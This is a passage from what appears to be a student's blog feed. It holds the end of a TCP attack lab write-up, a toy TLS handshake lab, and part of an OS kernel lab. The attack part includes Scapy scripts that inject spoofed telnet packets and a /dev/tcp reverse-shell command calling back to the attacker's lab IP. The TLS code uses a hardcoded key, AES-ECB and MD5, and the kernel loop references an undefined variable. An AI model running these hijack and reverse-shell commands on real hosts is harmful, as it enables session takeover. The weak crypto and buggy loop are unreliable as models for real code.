scapy.all <span class="hljs-keyword">import</span> *ip = IP(src=<span class="hljs-string">"10.0.2.7"</span>, dst=<span class="hljs-string">"10.0.2.5"</span>)tcp = TCP(sport=<span class="hljs-number">53246</span>, dport=<span class="hljs-number">23</span>, flags=<span class="hljs-number">16</span>, seq=<span class="hljs-number">3019183377</span>, ack=<span class="hljs-number">466497190</span>)data = <span class="hljs-string">"ls\r"</span>pkt = ip/tcp/datals(pkt)send(pkt,verbose=<span class="hljs-number">0</span>)</code></pre><p>之后wireshark抓包会发现有相应的包，并且data段的内容是我们想要看到的</p><p><img src="/2020/11/03/TCP-Attack/4-5.PNG" srcset="/img/loading.gif" alt="4-5"></p><h2 id="Task-5：使用TCP劫持实现反向shell"><a href="#Task-5：使用TCP劫持实现反向shell" class="headerlink" title="Task 5：使用TCP劫持实现反向shell"></a>Task 5：使用TCP劫持实现反向shell</h2><h3 id="实现原理与例子："><a href="#实现原理与例子：" class="headerlink" title="实现原理与例子："></a>实现原理与例子：</h3><p>当没有进行telnet链接的时候，由于下面的命令</p><pre><code class="hljs angelscript">/bin/bash -i &gt; /dev/tcp/<span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.4</span>/<span class="hljs-number">9090</span> <span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span></code></pre><p>将shell进行了重定向，将相应的标准输入和错误输出放到了对应IP地址的对应端口上面，所以之后在<strong>attack</strong>上面运行netcat监听，之后connet上之后就可以控制相应的命令</p><p><img src="/2020/11/03/TCP-Attack/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p><h3 id="具体实现（Scapy）"><a href="#具体实现（Scapy）" class="headerlink" title="具体实现（Scapy）"></a>具体实现（Scapy）</h3><ul><li><p>首先，在建立好telnet连接之后，查看wireshark来看对应的seq和ack</p><p>  <img src="/2020/11/03/TCP-Attack/5-2.PNG" srcset="/img/loading.gif" alt="5-2"></p></li><li><p>然后构造对应的py文件</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *ip = IP(src=<span class="hljs-string">"10.0.2.7"</span>, dst=<span class="hljs-string">"10.0.2.5"</span>)tcp = TCP(sport=<span class="hljs-number">53248</span>, dport=<span class="hljs-number">23</span>, flags=<span class="hljs-number">16</span>, seq=<span class="hljs-number">2735483318</span>, ack=<span class="hljs-number">3372370186</span>)data = <span class="hljs-string">"/bin/bash -i &gt; /dev/tcp/10.0.2.4/9090 0&lt;&amp;1 2&gt;&amp;1\r"</span>pkt = ip/tcp/datals(pkt)send(pkt,verbose=<span class="hljs-number">0</span>)</code></pre><p>  之后打开attack上面的监听端口，之后运行py文件</p><p>  <img src="/2020/11/03/TCP-Attack/5-3.PNG" srcset="/img/loading.gif" alt="5-3"></p><p>  <img src="/2020/11/03/TCP-Attack/5-4.PNG" srcset="/img/loading.gif" alt="5-4"></p><p>  可以看到已经实现了反弹shell</p></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li><p>Task1：SYN洪泛攻击</p><ul><li>在这里出现问题的原因是：潜在的对于”半开”的TCP连接的数量是存在要求的，如果没有这个上线限制，则就不存在该攻击的可能性，而现有的解决方案是SYN cookie防御，通过计算cookie值并且不预先分配存储空间可以进行有效避免</li></ul></li><li><p>Task2：TCP RST攻击</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TLS实验</title>
    <link href="/2020/10/30/TLS%E5%AE%9E%E9%AA%8C/"/>
    <url>/2020/10/30/TLS%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="设计文档"><a href="#设计文档" class="headerlink" title="设计文档"></a>设计文档</h1><p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><h2 id="主体思路"><a href="#主体思路" class="headerlink" title="主体思路"></a>主体思路</h2><p><img src="/2020/10/30/TLS%E5%AE%9E%E9%AA%8C/TLS%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B.png" srcset="/img/loading.gif" alt="TLS握手过程"></p><ul><li>通过socket编程首先先建立好明文传输的链接</li><li>hello阶段（如果是SSL的话，这里是SSL中握手协议的作用，并且后面的一些过程也是该协议）<ul><li>在这里，客户端通过链接来向服务器发送客户端所支持的协议以及加密算法，并生成随机数random1在这里参考了<a href="https://blog.csdn.net/ppdyhappy/article/details/68061238?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160405698519724835856267%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160405698519724835856267&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-1-68061238.pc_first_rank_v2_rank_v28&utm_term=cipher+suite%E5%AD%97%E6%AE%B5&spm=1018.2118.3001.4449" target="_blank" rel="noopener">TLS协议分析</a>这篇blog以及<a href="https://blog.csdn.net/weixin_30918415/article/details/99272349?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160405689319724838518146%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160405689319724838518146&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-4-99272349.pc_first_rank_v2_rank_v28&utm_term=TLS%E9%93%BE%E6%8E%A5%E5%BB%BA%E7%AB%8B%E8%BF%87%E7%A8%8B&spm=1018.2118.3001.4449" target="_blank" rel="noopener">SSL/TLS链接的建立</a>的blog，在这里采用AES-RSA-MD5作为cipher suit</li><li>服务器返回消息，在AES-RSA-MD5上与客户端达成一致，生成random 2</li></ul></li><li>证书发送及认证（certificate）阶段<ul><li>首先服务器将自己的证书下发给客户端，让客户端进行验证，之后客户端验证后从证书中取出公钥</li><li>由于难以自行形成证书，所以可以通过把简写的CA.txt文件当作证书，通过私钥验签的方式验证身份</li></ul></li><li>密钥交换<ul><li>使用RSA密钥交换方式，客户端生成session key</li></ul></li><li>将明文和计算的hash值进行连接</li><li>AES将明文+mac一起进行加密传输</li></ul><h2 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h2><ul><li><p><strong>server</strong></p><table><thead><tr><th align="center">函数</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">send_CA()</td><td align="center">利用私钥加密CA证书发送给客户端</td></tr><tr><td align="center">key_exchanging()</td><td align="center">使用私钥解密客户端发来的用公钥加密的sessionkey</td></tr><tr><td align="center">deAes()</td><td align="center">AES解密过程</td></tr><tr><td align="center">verify_mac()</td><td align="center">MD5计算收到的会话信息产生的hash值</td></tr><tr><td align="center">getplaintext()</td><td align="center">验证客户端封装的hash值和重新计算的hash值是否匹配</td></tr><tr><td align="center">msg()</td><td align="center">监听并打印会话信息</td></tr></tbody></table></li><li><p><strong>client</strong></p><table><thead><tr><th align="center">函数</th><th>解释</th></tr></thead><tbody><tr><td align="center">verify_ca()</td><td>客户端用公钥进行验签过程</td></tr><tr><td align="center">key_exchanging()</td><td>使用公钥加密sessionkey并发送给服务器</td></tr><tr><td align="center">enAes()</td><td>AES加密过程</td></tr><tr><td align="center">enmac()</td><td>MD5计算发送的信息产生的hash值并组装</td></tr><tr><td align="center">add_to_16()</td><td>将信息扩展位数成16整数倍</td></tr><tr><td align="center">msg()</td><td>加密信息发送到服务器</td></tr></tbody></table></li></ul><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="Socket-Connection"><a href="#Socket-Connection" class="headerlink" title="Socket Connection"></a>Socket Connection</h3><p>建立socket连接的过程如下</p><ul><li><p><strong>首先是server</strong></p><p>  服务器创建socket对象，绑定对应端口以及IP，等待接收连接</p>  <pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-comment">#创建socket对象s，基于internet地址和tcp协议</span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<span class="hljs-comment">#绑定本地端口8001</span>s.bind((<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">8001</span>))<span class="hljs-comment">#在本地8001端口监听，最大连接数量6</span>s.listen(<span class="hljs-number">6</span>)<span class="hljs-comment"># 接受来自客户端的连接</span>connection, address = s.accept()print(<span class="hljs-string">"服务器：Waiting for connection..."</span>)</code></pre></li><li><p><strong>其次是client</strong></p>  <pre><code class="hljs python"><span class="hljs-keyword">import</span> socketclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client.connect((<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">8001</span>))</code></pre></li></ul><h3 id="Hello阶段"><a href="#Hello阶段" class="headerlink" title="Hello阶段"></a>Hello阶段</h3><ul><li><p><strong>server</strong></p><p>  服务器等待客户的发送过来的消息，并且根据对方可用的加密算法来选择自己的加密算法，在这里直接假设双方只支持<strong>AES-RSA-MD5的cipher suit</strong></p>  <pre><code class="hljs python">data = connection.recv(<span class="hljs-number">1024</span>) <span class="hljs-comment">#the message received</span>print(<span class="hljs-string">'客户端: '</span>+data.decode(<span class="hljs-string">'utf-8'</span>))   <span class="hljs-comment">#hello,this is a hello message from the client</span>x = <span class="hljs-string">' OK.Let'</span><span class="hljs-string">'s use the AES-RSA-MD5. '</span></code></pre></li><li><p><strong>client</strong></p><p>  客户端通过已经建立好的链接来想想服务器发送消息，消息的主要目的是发送支持的加密算法，由服务器来选择相应的加密算法，在这里采用<strong>AES-RSA-MD5</strong></p>  <pre><code class="hljs python">x = <span class="hljs-string">'hello,this is a hello message from the client.Can we use AES-RSA-MD5?'</span>print(<span class="hljs-string">'客户端：'</span>+x)client.send(x.encode(<span class="hljs-string">'utf-8'</span>))</code></pre></li></ul><h3 id="证书发送及认证（certificate-amp-Verify）阶段"><a href="#证书发送及认证（certificate-amp-Verify）阶段" class="headerlink" title="证书发送及认证（certificate&amp;Verify）阶段"></a>证书发送及认证（certificate&amp;Verify）阶段</h3><ul><li><p><strong>server</strong></p><p>  当彼此选好了加密算法之后，服务器将证书发给客户端，并且用私钥数字签名的方式交付给客户端来进行CA的验证</p>  <pre><code class="hljs python">x1 = <span class="hljs-string">'\n服务器: These are my information, please check.'</span>print(<span class="hljs-string">'服务器：'</span>+x+x1)connection.send((x+x1).encode(<span class="hljs-string">'utf-8'</span>))<span class="hljs-comment">#私钥加密CA证书发送给客户端</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_CA</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'private_key_ca.pem'</span>) <span class="hljs-keyword">as</span> privatefile:        p = privatefile.read()        privkey = rsa.PrivateKey.load_pkcs1(p)        x = <span class="hljs-string">'\nserver'</span><span class="hljs-string">'s private key is as following'</span>        print(x+<span class="hljs-string">'\n'</span>+p)    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'CA'</span>) <span class="hljs-keyword">as</span> content:        ca = content.read()        print(<span class="hljs-string">'服务端\n'</span>+ca)    a = rsa.sign(ca.encode(<span class="hljs-string">'utf-8'</span>), privkey, <span class="hljs-string">'SHA-1'</span>)    <span class="hljs-keyword">return</span> asignature = send_CA()connection.sendto(signature, address)</code></pre></li><li><p><strong>client</strong></p><p>  客户端拿到证书之后用公钥的解密并且进行验证</p>  <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify_ca</span><span class="hljs-params">(data)</span>:</span>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'public_key_ca.pem'</span>) <span class="hljs-keyword">as</span> publickfile:        p = publickfile.read()        pubkey = rsa.PublicKey.load_pkcs1(p)        print(<span class="hljs-string">'---------CA公钥---------\n'</span>+p)    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'CA'</span>) <span class="hljs-keyword">as</span> content:        ca = content.read()        print(ca)    <span class="hljs-keyword">try</span>:        rsa.verify(ca.encode(<span class="hljs-string">'utf-8'</span>), data, pubkey)        print(<span class="hljs-string">'验证成功'</span>)    <span class="hljs-keyword">except</span>:        print(<span class="hljs-string">'验证失败'</span>)data = client.recv(<span class="hljs-number">1024</span>)verify_ca(data)</code></pre></li></ul><h3 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h3><ul><li><p><strong>client</strong></p><p>  采取24位长的 ‘0singdancerapbasketball0’作为session key（直接设置），之后就是用公钥进行加密，然后发送给服务器</p>  <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_exchanging</span><span class="hljs-params">()</span>:</span>    secretkey = <span class="hljs-string">'0singdancerapbasketball0'</span>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'public_key_ca.pem'</span>) <span class="hljs-keyword">as</span> publicfile:        p = publicfile.read()        pubkey = rsa.PublicKey.load_pkcs1(p)    crypto = rsa.encrypt(secretkey.encode(<span class="hljs-string">'utf-8'</span>), pubkey)    <span class="hljs-keyword">return</span> cryptoprint(<span class="hljs-string">'开始密钥交换,用公钥来对session key进行加密然后发送'</span>)client.send(key_exchanging())</code></pre></li><li><p><strong>server</strong></p><p>  服务器用私钥解密，获得session key</p>  <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_exchanging</span><span class="hljs-params">(data)</span>:</span>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'private_key_ca.pem'</span>) <span class="hljs-keyword">as</span> privatefile:        p = privatefile.read()        privkey = rsa.PrivateKey.load_pkcs1(p)    secretkey = rsa.decrypt(data, privkey)    <span class="hljs-keyword">return</span> secretkeyprint(<span class="hljs-string">'开始密钥交换，等待对称密钥'</span>)data = connection.recv(<span class="hljs-number">1024</span>)secretkey = key_exchanging(data).decode(<span class="hljs-string">'utf-8'</span>)print(<span class="hljs-string">'服务器：客户端发过来的对称密钥为:&#123;'</span>+secretkey+<span class="hljs-string">'&#125;(忽略大括号)'</span>)</code></pre></li></ul><h3 id="哈希值的计算"><a href="#哈希值的计算" class="headerlink" title="哈希值的计算"></a>哈希值的计算</h3><ul><li><strong>client</strong><ul><li>利用MD5来计算session的哈希值，并且之后加载到上面，中间的split为<strong>18307130049JHL</strong>，而由于加密信息的无规律，基本不会出现和split相同的内容进而引起对内容的解释的错误</li></ul></li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enmac</span><span class="hljs-params">(plaintext)</span>:</span>    h1 = hashlib.md5()    h1.update(plaintext.encode(<span class="hljs-string">'utf-8'</span>))    x = plaintext+<span class="hljs-string">'18307130049JHL'</span>+h1.hexdigest()    print(<span class="hljs-string">'明文+hash：'</span>+x)    <span class="hljs-keyword">return</span> x</code></pre><ul><li><p><strong>server</strong></p><p>  而服务器端也需要计算哈希值，根据得到的session的内容来计算哈希值，与客户端的哈希值进行匹配</p>  <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify_mac</span><span class="hljs-params">(plaintext)</span>:</span>    h1 = hashlib.md5()    h1.update(plaintext.encode(<span class="hljs-string">'utf-8'</span>))    <span class="hljs-keyword">return</span> h1.hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getplaintext</span><span class="hljs-params">(textandmac)</span>:</span>    str = textandmac.split(<span class="hljs-string">'18307130049JHL'</span>)    <span class="hljs-keyword">if</span>(str[<span class="hljs-number">1</span>] != verify_mac(str[<span class="hljs-number">0</span>])):        <span class="hljs-keyword">return</span> <span class="hljs-string">'false'</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> str[<span class="hljs-number">0</span>]</code></pre></li></ul><h3 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h3><ul><li><p><strong>client</strong></p><p>  将明文+hash的内容利用session key进行加密并传输</p>  <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encAes</span><span class="hljs-params">(x)</span>:</span>    key = <span class="hljs-string">'0singdancerapbasketball0'</span> <span class="hljs-comment">#24位密钥</span>    text = x    aes = AES.new(str.encode(key), AES.MODE_ECB)  <span class="hljs-comment"># 采用ECB加密模式</span>    encrypted_text = str(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding=<span class="hljs-string">'utf8'</span>).replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>)  <span class="hljs-comment"># 加密</span>    print(<span class="hljs-string">'加密结果为：'</span>, encrypted_text)    <span class="hljs-keyword">return</span> encrypted_text<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">msg</span><span class="hljs-params">(client)</span>:</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        re_data = input()        ciphertext = encAes(enmac(re_data))        client.send(ciphertext.encode(<span class="hljs-string">'utf-8'</span>))print(<span class="hljs-string">'------------------------------------------------'</span>)print(<span class="hljs-string">'验证交互信息'</span>)print(<span class="hljs-string">'------------------------------------------------'</span>)print(<span class="hljs-string">'用户请输入\n[只支持英文信息]'</span>)msg(client)</code></pre></li><li><p><strong>server</strong></p><p>  在服务端，将利用session来进行解密</p>  <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deAes</span><span class="hljs-params">(text, key)</span>:</span>    aes = AES.new(str.encode(key), AES.MODE_ECB)  <span class="hljs-comment"># 采用ECB加密模式</span>    decrypted_text = str(aes.decrypt(base64.decodebytes(bytes(text, encoding=<span class="hljs-string">'utf8'</span>))).rstrip(<span class="hljs-string">b'\0'</span>).decode(<span class="hljs-string">"utf8"</span>))  <span class="hljs-comment"># 解密</span>    <span class="hljs-keyword">return</span> decrypted_text<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">msg</span><span class="hljs-params">(connection)</span>:</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">try</span>:            data = connection.recv(<span class="hljs-number">1024</span>)            ciphertext = data.decode(<span class="hljs-string">'utf-8'</span>)            textandmac = deAes(ciphertext, secretkey)            plaintext = getplaintext(textandmac)            <span class="hljs-keyword">if</span>(plaintext == <span class="hljs-string">'false'</span>):                print(<span class="hljs-string">'mac值false，退出'</span>)                <span class="hljs-keyword">return</span>            <span class="hljs-keyword">else</span>:                print(<span class="hljs-string">'mac值相同验证通过'</span>)                print(<span class="hljs-string">'客户端：'</span>, plaintext)        <span class="hljs-keyword">except</span>:            print(<span class="hljs-string">'connection failed'</span>)            <span class="hljs-keyword">return</span>print(<span class="hljs-string">'------------------------------------------------'</span>)print(<span class="hljs-string">'验证交互信息'</span>)print(<span class="hljs-string">'------------------------------------------------'</span>)print(<span class="hljs-string">'等待用户输入'</span>)msg(connection)</code></pre></li></ul><h2 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h2><p>下面是一些运行截图</p><p>首先是运行server.py之后运行client.py(server图片–client图片–server图片–client图片)</p><p><img src="/2020/10/30/TLS%E5%AE%9E%E9%AA%8C/TLS-1.PNG" srcset="/img/loading.gif" alt="TLS-1"></p><p><img src="/2020/10/30/TLS%E5%AE%9E%E9%AA%8C/TLS-2.PNG" srcset="/img/loading.gif" alt="TLS-2"></p><p><img src="/2020/10/30/TLS%E5%AE%9E%E9%AA%8C/TLS-3.PNG" srcset="/img/loading.gif" alt="TLS-3"></p><p><img src="/2020/10/30/TLS%E5%AE%9E%E9%AA%8C/TLS-4.PNG" srcset="/img/loading.gif" alt="TLS-4"></p><h2 id="附CA"><a href="#附CA" class="headerlink" title="附CA"></a>附CA</h2><pre><code class="hljs angelscript">-------------Verify--------------Sequence num:<span class="hljs-number">01010101</span>Version:X<span class="hljs-number">.509</span>Public key Algorithm: RSAdate:<span class="hljs-number">2020.10</span><span class="hljs-number">.28</span><span class="hljs-number">-2020.11</span><span class="hljs-number">.28</span>Server:jhlsplit:<span class="hljs-number">18307130049</span>JHL--------------DONE--------------------BEGIN RSA PUBLIC KEY-----MIGJAoGBAMhK8UrmtY+iSUrQhhcxAA8eAgB99gpKjbx8uo15geRbcr3pqR192WdmUcyXoZ7MH+FEtQ4v14awNsoub0NcgUepHj2xzzat7pes4NZz/<span class="hljs-number">9</span>YCLEgFA+<span class="hljs-number">5</span>/VnKnez5FoHwfQT58XsXFXKOni35sMIVEgoCLdURELd09nBsGCqzR9tiVAgMBAAE=-----END RSA PUBLIC KEY-----</code></pre><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><ul><li><p>首先，先了解一下什么是TLS/SSL以及他们的作用</p></li><li><p>相当于是在应用层和在运输层之间添加了一个SSL协议层，而SSL协议分为了两层，一层是SSL记录协议：是为上层的数据提供数据的封装加密等等；而SSL握手协议：是在数据传输开始之前，双方进行身份确认，协商机密算法，交换加密密钥的过程</p></li><li><p>关于TLS/SSL建立连接以及握手的过程</p><p>  <img src="/2020/10/30/TLS%E5%AE%9E%E9%AA%8C/TLS%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B.png" srcset="/img/loading.gif" alt="TLS握手过程"></p><ul><li><p>阶段一</p><ul><li>Client Hello，发送random 1，客户端支持的加密算法的组合列表等</li><li>Server Hello，从客户端发送的加密算法的组合列表中进行选择，生成random 2</li></ul></li><li><p>阶段二（服务器鉴别以及密钥交换）</p><ul><li>服务器将自己的证书CA发送给客户端，让客户端进行验证，客户端验证后从CA中取出对应的公钥</li><li>可要求客户端上报CA，</li><li>通知客户端Server Hello结束</li></ul></li><li><p>客户鉴别和密钥交换</p><ul><li>验证好服务端的CCA之后，取出公钥，将session key用公钥加密之后发送给服务器，服务器用私钥解密之后获得session key</li></ul></li><li><p>阶段四</p><ul><li>计算session对应的hash值，之后双方在进行通信的过程中，如果两个hash值匹配了，说明对应的session会话过程建立起来了，之后将hash值放在明文后面，并且用session key来进行加密</li></ul></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Software security lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>process-lab</title>
    <link href="/2020/10/24/process-lab/"/>
    <url>/2020/10/24/process-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="process-amp-thread"><a href="#process-amp-thread" class="headerlink" title="process&amp;thread"></a>process&amp;thread</h1><h2 id="Exercise-2：创建并且运行process"><a href="#Exercise-2：创建并且运行process" class="headerlink" title="Exercise 2：创建并且运行process"></a>Exercise 2：创建并且运行process</h2><p>首先是env_init（）函数</p><p>函数的作用：1. 初始化所有的在envs数组中的 Env结构体，并把它们加入到 env_free_list中。</p><ol start="2"><li><p>还要调用 env_init_percpu，这个函数要配置段式内存管理系统，让它所管理的段，可能具有两种访问优</p><p> 先级其中的一种，一个是内核运行时的0优先级，以及用户运行时的3优先级</p></li></ol><p>code如下：</p><pre><code class="hljs angelscript"><span class="hljs-built_in">void</span>env_init(<span class="hljs-built_in">void</span>)&#123;<span class="hljs-comment">// Set up envs array</span><span class="hljs-comment">// LAB 3: Your code here.</span><span class="hljs-built_in">int</span> number;env_free_list = NULL;<span class="hljs-keyword">for</span> ( number = NENV - <span class="hljs-number">1</span>; number &gt; <span class="hljs-number">0</span> ; number--) <span class="hljs-comment">//the maxium number of the free_list</span>&#123;envs[i].env_id = <span class="hljs-number">0</span>;envs[i].env_status = ENV_FREE;envs[i].env_link = env_free_list; <span class="hljs-comment">//the env_free_list is a pointer which point to the next free process</span>env_free_list = &amp;envs[i];<span class="hljs-comment">//update the env_free_list</span>&#125;<span class="hljs-comment">// panic("env_init not yet implemented");</span><span class="hljs-comment">// Per-CPU part of the initialization</span>env_init_percpu();&#125;</code></pre><p>之后是env_setup_vm（）函数：</p><p>具体作用：为一个新的process分配一个页面目录，并且初始化这个页面目录中与kernal相关的部分</p><p>code：</p><pre><code class="hljs lisp">static intenv_setup_vm(<span class="hljs-name">struct</span> Env *e)&#123;int i;struct PageInfo *p = NULL<span class="hljs-comment">;</span>// Allocate a page for the page directoryif (!(<span class="hljs-name">p</span> = page_alloc(<span class="hljs-name">ALLOC_ZERO</span>)))return -E_NO_MEM<span class="hljs-comment">;</span>// LAB <span class="hljs-number">3</span>: Your code here.e-&gt;env_pgdir = (<span class="hljs-name">pde_t*</span>)page2kva(<span class="hljs-name">p</span>)<span class="hljs-comment">;</span>p-&gt;pp_ref++<span class="hljs-comment">; </span>//put the directory below UTOPfor (<span class="hljs-name">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; PDX(UTOP); i++)</span>&#123;e-&gt;env_pgdir[i] = <span class="hljs-number">0</span><span class="hljs-comment">;</span>&#125;//put the directory above UTOPfor ( <span class="hljs-name">i</span> = PDX(<span class="hljs-name">UTOP</span>) <span class="hljs-comment">; i &lt; NPDENTRIES; i++)</span>&#123;e-&gt;env_pgdir[i] = kern_pgdir[i]<span class="hljs-comment">;</span>&#125;// e-&gt;env_pgdir = KADDR(<span class="hljs-name">page2pa</span>(<span class="hljs-name">p</span>))<span class="hljs-comment">;</span>// memcpy((<span class="hljs-name">void*</span>)(<span class="hljs-name">e-&gt;env_pgdir</span>), (<span class="hljs-name">void*</span>)kern_pgdir, PGSIZE)<span class="hljs-comment">;</span>// UVPT maps the env's own page table read-only.// Permissions: kernel R, user Re-&gt;env_pgdir[PDX(<span class="hljs-name">UVPT</span>)] = PADDR(<span class="hljs-name">e-&gt;env_pgdir</span>) | PTE_P | PTE_U<span class="hljs-comment">;</span>return <span class="hljs-number">0</span><span class="hljs-comment">;</span>&#125;</code></pre><p>region_alloc（）函数</p><p>作用：为process分配和映射物理内存</p><p>Hint：当”len“个bytes和对应虚拟地址为”va“不是页对齐的时候会更加简单，va向下取整，而va+len向上取整</p><p>code</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>region_alloc(struct Env *e, <span class="hljs-keyword">void</span> *va, <span class="hljs-keyword">size_t</span> len)&#123;<span class="hljs-comment">// LAB 3: Your code here.</span><span class="hljs-comment">// (But only if you need it for load_icode.)</span><span class="hljs-comment">//</span><span class="hljs-comment">// Hint: It is easier to use region_alloc if the caller can pass</span><span class="hljs-comment">//   'va' and 'len' values that are not page-aligned.</span><span class="hljs-comment">//   You should round va down, and round (va + len) up.</span><span class="hljs-comment">//   (Watch out for corner-cases!)</span><span class="hljs-keyword">uint32_t</span> VA = ROUNDDOWN((<span class="hljs-keyword">uint32_t</span>)va, PGSIZE);<span class="hljs-keyword">uint32_t</span> N = ROUNDUP((<span class="hljs-keyword">uint32_t</span>)va + len, PGSIZE);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">uint32_t</span> i = VA; i&lt; N; i += PGSIZE)&#123;<span class="hljs-keyword">if</span>(page_lookup(e-&gt;env_pgdir, (<span class="hljs-keyword">void</span>*)i, <span class="hljs-literal">NULL</span>))<span class="hljs-keyword">continue</span>;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span>* <span class="hljs-title">pp</span> = <span class="hljs-title">page_alloc</span>(0);</span><span class="hljs-keyword">if</span>(!pp) panic(<span class="hljs-string">"region_alloc: alloc env region failed."</span>);page_insert(e-&gt;env_pgdir, pp, (<span class="hljs-keyword">void</span>*)i, PTE_U|PTE_W);&#125;&#125;</code></pre><p>load_icode()函数</p><p>主要作用：解析二进制ELF映像，并且把它的内容加到对应的process的用户地址空间中</p><p>code</p><pre><code class="hljs xl">static voidload_icode(struct Env *e, uint8_t *binary)&#123;<span class="hljs-comment">// LAB 3: Your code here.</span>struct Elf *elf = (struct Elf*) binary;struct Proghdr* ph, *eph;<span class="hljs-function"><span class="hljs-title">if</span> (elf-&gt;</span>e_magic != ELF_MAGIC)panic(<span class="hljs-string">"Not valid ELF file."</span>);<span class="hljs-function"><span class="hljs-title">ph</span> = (struct Proghdr *) ((uint8_t *) elf + elf-&gt;</span>e_phoff);<span class="hljs-function"><span class="hljs-title">eph</span> = ph + elf-&gt;</span>e_phnum;<span class="hljs-function"><span class="hljs-title">lcr3</span>(PADDR(e-&gt;</span>env_pgdir));<span class="hljs-keyword">for</span> (; ph &lt; eph; ph++)&#123;<span class="hljs-function"><span class="hljs-title">if</span>(!(ph-&gt;</span><span class="hljs-function"><span class="hljs-title">p_filesz</span> &lt;= ph-&gt;</span>p_memsz))panic(<span class="hljs-string">"Bad proghdr!"</span>);<span class="hljs-function"><span class="hljs-title">if</span>(ph-&gt;</span>p_type != ELF_PROG_LOAD) continue;<span class="hljs-function"><span class="hljs-title">uint32_t</span> va = ph-&gt;</span>p_va;<span class="hljs-function"><span class="hljs-title">region_alloc</span>(e, (void*)va,  ph-&gt;</span>p_memsz);<span class="hljs-function"><span class="hljs-title">memcpy</span>((void*)va, (void*)(binary + ph-&gt;</span><span class="hljs-function"><span class="hljs-title">p_offset</span>), ph-&gt;</span>p_memsz);<span class="hljs-function"><span class="hljs-title">memset</span>((void*)va+ph-&gt;</span><span class="hljs-function"><span class="hljs-title">p_filesz</span>, '\0', ph-&gt;</span><span class="hljs-function"><span class="hljs-title">p_memsz</span> - ph-&gt;</span>p_filesz);&#125;<span class="hljs-comment">// switch back to kern_pgdir</span>lcr3(PADDR(kern_pgdir));<span class="hljs-comment">// save the eip in trapframe</span><span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">env_tf</span>.tf_eip = elf-&gt;</span>e_entry;<span class="hljs-comment">// Now map one page for the program's initial stack</span><span class="hljs-comment">// at virtual address USTACKTOP - PGSIZE.</span><span class="hljs-comment">// LAB 3: Your code here.</span>region_alloc(e, (void*)(USTACKTOP - PGSIZE), PGSIZE);<span class="hljs-comment">// note that stack top has been set by env_alloc()</span>&#125;</code></pre><p>env_creat（）函数：</p><p>参数* 